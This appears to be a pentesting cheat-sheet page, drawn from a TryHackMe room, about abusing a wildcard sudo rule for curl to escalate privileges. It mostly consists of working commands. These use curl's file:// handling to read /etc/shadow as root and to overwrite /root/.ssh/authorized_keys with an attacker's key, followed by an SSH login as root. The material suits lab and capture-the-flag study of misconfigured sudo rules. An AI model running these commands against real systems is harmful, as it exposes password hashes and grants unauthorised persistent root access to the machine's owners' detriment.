# Sudo Curl Privilege Escalation

The `sudo curl` command might be vulnerable to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
sudo -l

(root) /usr/bin/curl 127.0.0.1/*
```

If current user is allowed to execute the command above as root privilege, we can read arbitrary files in the target system or can add our SSH key in the root home directory by abusing the asterisk (`*`).

I found this setting on **Robots** room on TryHackMe.

### Exploit <a href="#exploit" id="exploit"></a>

#### Option 1. Read Files <a href="#option-1-read-files" id="option-1-read-files"></a>

```shellscript
sudo /usr/bin/curl 127.0.0.1/ file:///etc/shadow
```

As above, we can read the content of the `/etc/shadow` as root.

#### Option 2. Add SSH Key <a href="#option-2-add-ssh-key" id="option-2-add-ssh-key"></a>

We can also add our SSH public key to `/root/.ssh/authorized_keys`.\
First, generate SSH keys in our local machine:

```shellscript
ssh-keygen -f key

# Display the content of the public key, and copy it.
cat key.pub
```

Next, in target machine, write the content of this public key:

```
echo -n '<content_of_public_key>' > /tmp/key.pub
```

Now, we can write this content to `/root/.ssh/authorized_keys` via `curl`:

```
sudo /usr/bin/curl 127.0.0.1/ -o /tmp/ignore file:///tmp/key.pub -o /root/.ssh/authorized_keys
```

By this, we can login SSH as root, using our private key:

```shellscript
# Run it our local machine
chmod 600 key
ssh root@<target-ip> -i key
```
